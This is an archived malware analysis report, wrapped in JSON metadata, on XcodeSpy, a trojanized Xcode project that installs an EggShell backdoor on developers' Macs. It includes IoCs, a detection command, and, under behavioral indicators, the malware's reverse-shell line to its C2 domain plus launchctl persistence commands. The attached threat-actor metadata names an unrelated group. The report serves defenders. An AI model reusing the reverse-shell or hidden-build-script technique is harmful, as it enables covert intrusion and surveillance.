{
    "id": "7ba12ab5-15c5-425e-8827-7c85596486a1",
    "created_at": "2023-01-12T14:59:23.282715Z",
    "updated_at": "2025-03-27T02:13:29.403545Z",
    "deleted_at": null,
    "sha1_hash": "e6b6d87f5a53abc8c449fb88f60d9c3357cdab04",
    "title": "2021-03-18 - New macOS malware XcodeSpy Targets Xcode Developers with EggShell Backdoor",
    "authors": "",
    "file_creation_date": "2022-05-28T19:56:05Z",
    "file_modification_date": "2022-05-28T19:56:05Z",
    "file_size": 3364752,
    "plain_text": "# New macOS Malware XcodeSpy Targets Xcode Developers with EggShell Backdoor\n\n**[labs.sentinelone.com/new-macos-malware-xcodespy-targets-xcode-developers-with-eggshell-backdoor/](https://labs.sentinelone.com/new-macos-malware-xcodespy-targets-xcode-developers-with-eggshell-backdoor/)**\n\nPhil Stokes\n\n## Executive Summary\n\nThreat actors are abusing the Run Script feature in Apple’s Xcode IDE to infect\nunsuspecting Apple Developers via shared Xcode Projects.\nXcodeSpy is a malicious Xcode project that installs a custom variant of the EggShell\nbackdoor on the developer’s macOS computer along with a persistence mechanism.\nThe backdoor has functionality for recording the victim’s microphone, camera and\nkeyboard, as well as the ability to upload and download files.\nThe XcodeSpy infection vector could be used by other threat actors, and all Apple\nDevelopers using Xcode are advised to exercise caution when adopting shared Xcode\nprojects.\n[SentinelOne Singularity protects against XcodeSpy. We also provide a simple method](https://www.sentinelone.com/platform/)\ndevelopers can use to scan their Xcode repositories for XcodeSpy in this post.\n\n## Overview\n\nThis year has brought two disturbing new trends into prominence: the targeting of developers\nand the use of supply chain attacks to infect broad swaths of customers. Targeting software\ndevelopers is the first step in a successful supply chain attack. One way to do so is to abuse\n\n\n-----\n\n[the very development tools necessary to carry out this work. In Jan 2021, Google TAG](https://blog.google/threat-analysis-group/new-campaign-targeting-security-researchers/)\nannounced their discovery of a North Korean campaign targeting security researchers and\nexploit developers. One of the methods of infection entailed the sharing of a Visual Studio\nproject designed to load a malicious DLL. In this post, we discuss a similar attack targeting\nApple developers through malicious Xcode projects.\n\nWe recently became aware of a trojanized Xcode project in the wild targeting iOS developers\nthanks to a tip from an anonymous researcher. The malicious project is a doctored version of\na legitimate, open-source project available on GitHub. The project offers iOS developers\nseveral advanced features for animating the iOS Tab Bar based on user interaction.\n\nThe XcodeSpy version, however, has been subtly changed to execute an obfuscated Run\nScript when the developer’s build target is launched. The script contacts the attackers’ C2\nand drops a custom variant of the EggShell backdoor on the development machine. The\nmalware installs a user LaunchAgent for persistence and is able to record information from\nthe victim’s microphone, camera, and keyboard.\n\nWe have discovered two variants of the payload, custom backdoors which contain a number\nof encrypted C2 URLs and encrypted strings for various file paths. One encrypted string in\nparticular is shared between the doctored Xcode project and the custom backdoors, linking\nthem together as part of the same ‘XcodeSpy’ campaign.\n\nAt this time, we are aware of one ITW case in a U.S. organization. Indications from our\nanalysis suggest the campaign was in operation at least between July and October 2020 and\nmay also target developers in Asia.\n\nWe have thus far been unable to discover other samples of trojanized Xcode projects and\ncannot gauge the extent of this activity. However, the timeline from known samples and other\nindicators mentioned below suggest that other XcodeSpy projects may exist. By sharing\n\n\n-----\n\ndetails of this campaign, we hope to raise awareness of this attack vector and highlight the\nfact that developers are high-value targets for attackers.\n\nThe simple technique for hiding and launching a malicious script used by XcodeSpy could be\ndeployed in any shared Xcode project. Consequently, all Apple developers are cautioned to\ncheck for the presence of malicious Run Scripts whenever adopting third-party Xcode\nprojects. We provide a simple method developers can use to scan their existing local Xcode\nrepositories in the Detection and Mitigation section below.\n\n## Abusing Xcode’s Run Script Functionality\n\nXcodeSpy takes advantage of a built-in feature of Apple’s IDE which allows developers to\nrun a custom shell script on launching an instance of their target application. While the\ntechnique is easy to identify if looked for, new or inexperienced developers who are not\naware of the Run Script feature are particularly at risk since there is no indication in the\nconsole or debugger to indicate execution of the malicious script.\n\nThe sample we analyzed used a copy of a legitimate open-source project that can be found\n[on Github called TabBarInteraction. For the avoidance of any doubt, the code in the Github](https://github.com/potato04/TabBarInteraction)\nproject is not infected with XcodeSpy, nor is the developer, potato04, implicated in any way\nwith the malware operation.\n\nIn the [doctored version of TabBarInteraction, the obfuscated malscript can be found in the](https://www.virustotal.com/gui/file/1cfa154d0145c1fe059ffe61e7b295c16bbc0e0b0e707e7ad0b5f76c7d6b66d2/detection)\nBuild Phases tab. By default, the Run Script panel is not expanded, further aiding the\nmalware’s bid to avoid detection by casual inspection.\n\nClicking the disclosure button reveals the existence of the obfuscated script.\n\n\n-----\n\nThe obfuscation is rather simple and the output can be inspected safely by substituting\n```\neval with echo and running the script in a separate shell.\n\n```\nThe script creates a hidden file called `.tag in the` `/tmp directory, which contains a single`\ncommand: `mdbcmd . This in turn is piped via a reverse shell to the attackers C2.`\n\nAs we went to press today, the sample was not detected by any of the static engines on\nVirusTotal.\n\n\n-----\n\n## Linking XcodeSpy to a Custom EggShell Backdoor\n\nBy the time we discovered the malicious Xcode project, the C2 at `cralev[.]me was`\nalready offline, so it was not possible to ascertain directly the result of the `mdbcmd`\ncommand. Fortunately, however, there are two samples of the EggShell backdoor on\nVirusTotal that contain the telltale XcodeSpy string `/private/tmp/.tag .`\n\n```\ncdad080d2caa5ca75b658ad102987338b15c7430c6f51792304ef06281a7e134\n\n```\n\nThese samples were both uploaded to VirusTotal via the Web interface from Japan, the first\non August 5th and the second on October 13th.\n\nThe later sample was also found in the wild in late 2020 on a victim’s Mac in the United\nStates. For reasons of confidentiality, we are unable to provide further details about the ITW\nincident. However, the victim reported that they are repeatedly targeted by North Korean\nAPT actors and the infection came to light as part of their regular threat hunting activities.\n\nThe samples uploaded from Japan to VirusTotal came from users who were not signed in to\na VirusTotal account, so it is impossible to say whether they came from the same source or\ntwo different sources. Nonetheless, they are both linked to each other and the Xcode project\nvia containing the string `P4CCeYZxhHU/hH2APz6EcXc=, which turns out to be an encrypted`\nversion of the `/private/tmp/.tag string found in the malicious Xcode project.`\n\nThe EggShell backdoors use a simple string encryption technique. Decryption involves\npassing an encrypted string to the `[StringUtil decode:] method, which encodes the`\n[encrypted string in base64, then iterates over each byte, adding](https://www.sentinelone.com/blog/guide-encode-decoded-base64/) `0xf0 to it. This produces a`\nprintable ASCII character code which is then concatenated to produce the full string.\n\n\n-----\n\nWe can implement our own decoder in Objective-C based on the pseudo code above to\ndecrypt the strings in the Mach-O binaries.\n\nDecoding further strings in both variants reveals a number of hardcoded URLs used for\nuploading data from the victim’s machine.\n```\nhttps://www.suppro.co/category/search.php?ts=%@\nhttps://www.liveupdate.cc/preview/update.php?ts=%@\nhttps://www.appmarket.co/category/search.php?ts=%@\nhttps://www.recentnews.cc/latest/details.php?ts=%@\nhttps://www.truckrental.cc/order/search.php?ts=%@\nhttps://www.everestnote.com/sheet/list.php?ts=%@\nhttps://www.alinbox.co/product/product_detail.php?ts=%@\n\n```\n\n-----\n\nWhere data exists, all these domains from the backdoor binaries were first seen or first\n“whois”-queried on the 10th or 11th of September.\n\nThe domain `cralev[.]me from the malicious Xcode project was also first seen on the 10th`\nof September.\n\nThe doctored version of the TabBarInteraction Xcode project was itself first seen on\nVirusTotal a week earlier, on 4th September.\n\n\n-----\n\nThe juxtaposition of these dates leads us to speculate that the attackers themselves may\nhave uploaded the XcodeSpy project file to VirusTotal to test detection before activating their\nC2s. Aside from the `suppro[.]co and` `cralev[.]me domains, the others appear to be`\ninactive or unregistered, perhaps awaiting future use. Interestingly, the country code\navailable from VT about the XcodeSpy uploader’s location is ‘ZZ’ – unknown.\n\nMeanwhile, the EggShell backdoor variants were each first seen on VirusTotal some two\nmonths apart (5th August and 13th October). If the backdoors were uploaded by victims\nrather than the attackers (an assumption that is by no means secure), that would indicate\nthat the first custom EggShell binary may have been a payload for an earlier XcodeSpy\nsample. However, we cannot assign great confidence to these speculations based on the\navailable data. What we do know is that the first EggShell payload was uploaded a full month\nbefore the known dropper and over two months before the second payload was seen on\nVirusTotal on 13th October.\n\n## EggShell Execution Behavior\n\nOn execution, the customized EggShell binaries drop a LaunchAgent either at\n```\n~/Library/LaunchAgents/com.apple.usagestatistics.plist or\n~/Library/LaunchAgents/com.apple.appstore.checkupdate.plist . This plist checks\n\n```\nto see if the original executable is running; if not, it creates a copy of the executable from a\n‘master’ version at `~/Library/Application Support/com.apple.AppStore/.update`\nthen executes it.\n\n\n-----\n\nThe EggShell also drops a zero byte file at `/private/tmp/wt0217.lck, and a data file at`\n```\n~/Library/Application Scripts/com.apple.Preview.stors . A number of other\n\n```\nfilepaths are also encrypted in the binaries (see the IoCs at the end of this post for a full list).\nAlmost all of these paths have been customized by the attacker. However, one encrypted\nstring decrypts to `/tmp/.avatmp, a default path found in the public EggShell repo for`\nstoring AV captures.\n\nThe source code in the public EggShell repo contains various functions for persistence,\nscreen capture and AV recording, among other things.\n\n\n-----\n\nAnalysis of the compiled XcodeSpy variants found in the wild and on VirusTotal implement\nthese as well as their own custom data encoding and keylogging methods.\n\n\n-----\n\n## Detection and Mitigation\n\n\n-----\n\nA full list of known IoCs is provided at the end of this post. As all C2s, path names and\nencrypted strings are highly customizable and easy to change, these may only be useful as\nindicators of past compromise for these particular samples. Therefore, a behavioral detection\nsolution is required to fully detect the presence of XcodeSpy payloads.\n\nThreat hunters and developers concerned as to whether they have inadvertently downloaded\na project containing XcodeSpy can run a manual search with the following on the command\nline:\n```\nfind . -name \"project.pbxproj\" -print0 | xargs -0 awk '/shellScript/ && /eval/{print\n\"033[37m\" $0 \"033[31m\" FILENAME}'\n\n```\nThis searches for Run Scripts in the Build Phases part of an Xcode project (within the\n```\nproject.pbxproj file) containing both the strings shellScript and eval . If any are\n\n```\nfound, it prints out a copy of the script for inspection, along with the filename in which it was\nfound.\n\nThe following example searches for XcodeSpy in the Documents folder and all its subfolders.\n\nUsers should switch to the appropriate parent folder in which they save Xcode projects\nbefore running the command.\n\nIndividual projects can of course be inspected for malicious Run Scripts via the Build Phases\ntab in the Xcode project navigator.\n\n## Conclusion\n\nThis is not the first time threat actors have used Xcode as a vector to infect Apple platform\n[developers. In 2015, XcodeGhost offered iOS developers in China a version of Xcode that](https://unit42.paloaltonetworks.com/novel-malware-xcodeghost-modifies-xcode-infects-apple-ios-apps-and-hits-app-store/)\ndownloaded faster from local mirrors than from Apple’s servers. What the recipients didn’t\nknow was that the version of Xcode they received had been altered to inject malicious code\ninto any apps compiled with it. Apps compiled with XcodeGhost could be used by the\nattackers to read and write to the device clipboard, open specific URLs (e.g., WhatsApp,\nFacebook) and exfiltrate data to C2s. In effect, XcodeGhost was a supply chain attack,\ninfecting downstream victims by means of third-party software.\n\nIn contrast, XcodeSpy takes the form of a trojanized Xcode project, making it lighter and\neasier to distribute than a full version of the Xcode IDE. While XcodeSpy appears to be\ndirectly targeted at the developers themselves rather than developers’ products or clients, it’s\n\n\n-----\n\na short step from backdooring a developer s working environment to delivering malware to\nusers of that developer’s software.\n\nIt is entirely possible that XcodeSpy may have been targeted at a particular developer or\ngroup of developers, but there are other potential scenarios with such high-value victims.\nAttackers could simply be trawling for interesting targets and gathering data for future\ncampaigns, or they could be attempting to gather AppleID credentials for use in other\ncampaigns that use malware with valid Apple Developer code signatures. These suggestions\ndo not exhaust the possibilities, nor are they mutually exclusive.\n\nWe hope that this publication will raise awareness of this threat, and we would be very\ninterested to hear from other researchers or individuals that find evidence of XcodeSpy\ninfections in the wild.\n\n## Indicators of Compromise\n\n**URLs & Resolving IPs**\n\nwww[.]cralev.me/\n\nhxxps://www[.]liveupdate.cc/preview/update.php\n\nhxxps://www[.]appmarket.co/category/search.php\n\nhxxps://www[.]recentnews.cc/latest/details.php\n\nhxxps://www[.]truckrental.cc/order/search.php\n\nhxxps://www[.]everestnote.com/sheet/list.php\n\nhxxps://www[.]alinbox.co/product/product_detail.php\n\nhxxps://www[.]suppro.co/category/search.php\n\nhxxps://www[.]elemark.co/product/list.php\n\n193.34.167.111\n\n193.34.167.205\n\n193.34.166.127\n\n**EggShell bins: */.update**\n\nSHA 256: 6d93a714dd008746569c0fbd00fadccbd5f15eef06b200a4e831df0dc8f3d05b\n\nSHA 1: 556a2174398890e3d628aec0163a42a7b7fb8ffd\n\nSHA 256: cdad080d2caa5ca75b658ad102987338b15c7430c6f51792304ef06281a7e134\n\nSHA 1: 0ae9d61185f793c6d53e560e91265583675abeb6\n\nSHA 256: 6a1f7edf41ac2d52e3d0442b825bbdaf404199ed8b45b33ecd52a58acc12087a\n\nSHA 1: 4d1006610a4fe903b6b9fdb41cff7fc88b3a580c\n\n**Xcode proj: TabBarInteraction.zip**\n\nSHA 256: 1cfa154d0145c1fe059ffe61e7b295c16bbc0e0b0e707e7ad0b5f76c7d6b66d2\n\nSHA 1: d65334d6c829955947f0ceb2258581c59cfd7dab\n\n\n-----\n\n**Encoded Filepaths**\n~/Library/Application Scripts/com.apple.TextEdit/.stors\n~/Library/Application Scripts/com.apple.Preview/.stors\n~/Library/Application Scripts/com.apple.usernoted/.wfy1607\n~/Library/Application Scripts/com.apple.TextEdit/.scriptdb\n~/Library/Application Support/com.apple.AppStore/.update\n~/Library/Application Support/com.apple.usernoted/.wfy1607\n~/Library/LaunchAgents/com.apple.usagestatistics.plist\n~/Library/LaunchAgents/com.apple.appstore.checkupdate.plist\n/private/tmp/.osacache\n/private/tmp/.osacache2\n/private/tmp/.update\n/tmp/.avatmp\n/private/tmp/.wt0217.lck\n/private/tmp/.wt0173.lck\n/private/tmp/.tag\n\n**Behavioral Indicators**\n```\nkillall %@;sleep 3;cp \"%@\" \"%@\";chmod +x \"%@\";\"%@\" %@ 1>/dev/null\n2>/dev/null\nif (! pgrep -x %@ >/dev/null);then cp \"%@\" \"%@\";chmod +x \"%@\";\"%@\";fi;\nsleep 1;launchctl unload \"%@\" > /dev/null;launchctl load \"%@\" > /dev/null\nlaunchctl unload \"%@\" 2>/dev/null; rm \"%@\"\necho mdbcmd > /private/tmp/.tag;bash&> /dev/tcp/www.cralev.me/443 0>&1 &\n\n```\n**MITRE ATT&CK TTPs**\nApplication Layer Protocol: Web Protocols | XcodeSpy can use HTTPS in C2\n[Communications T1071 001.](https://attack.mitre.org/techniques/T1071/001)\nCreate or Modify System Process: Launch Agent | XcodeSpy can establish persistence via a\n[LaunchAgent T1543 001.](https://attack.mitre.org/techniques/T1543/001)\n[File and Directory Discovery | XcodeSpy can scan directories on a compromised host T1083.](https://attack.mitre.org/techniques/T1083)\nHide Artifacts: Hidden Files and Directories | XcodeSpy hides several files with a dot prefix to\n[make them hidden from view in the Finder application T1564 001.](https://attack.mitre.org/techniques/T1564/001)\n[Ingress Tool Transfer | XcodeSpy can download its payload from a C2 server T1105.](https://attack.mitre.org/techniques/T1105)\nMasquerading | XcodeSpy drops several files at paths using the “com.apple” reverse\nidentifier and in subfolders named after legitimate macOS system software (TextEdit,\nPreview) [T1036.](https://attack.mitre.org/techniques/T1036)\nInput Capture: Keylogging | XcodeSpy can log user keystrokes to intercept credentials as the\nuser types them [T1056 001.](https://attack.mitre.org/techniques/T1056/001/)\nInput Capture: GUI Input Capture | XcodeSpy can prompt users for credentials with a\n[seemingly legitimate prompt via AppleScript T1056 002.](https://attack.mitre.org/techniques/T1056/002/)\n[Process Discovery | XcodeSpy can collect data on running and parent processes T1057.](https://attack.mitre.org/techniques/T1057)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-03-18 - New macOS malware XcodeSpy Targets Xcode Developers with EggShell Backdoor.pdf"
    ],
    "report_names": [
        "2021-03-18 - New macOS malware XcodeSpy Targets Xcode Developers with EggShell Backdoor.pdf"
    ],
    "threat_actors": [
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535563,
    "ts_updated_at": 1743041609,
    "ts_creation_date": 1653767765,
    "ts_modification_date": 1653767765,
    "files": {
        "pdf": "https://archive.orkl.eu/e6b6d87f5a53abc8c449fb88f60d9c3357cdab04.pdf",
        "text": "https://archive.orkl.eu/e6b6d87f5a53abc8c449fb88f60d9c3357cdab04.txt",
        "img": "https://archive.orkl.eu/e6b6d87f5a53abc8c449fb88f60d9c3357cdab04.jpg"
    }
}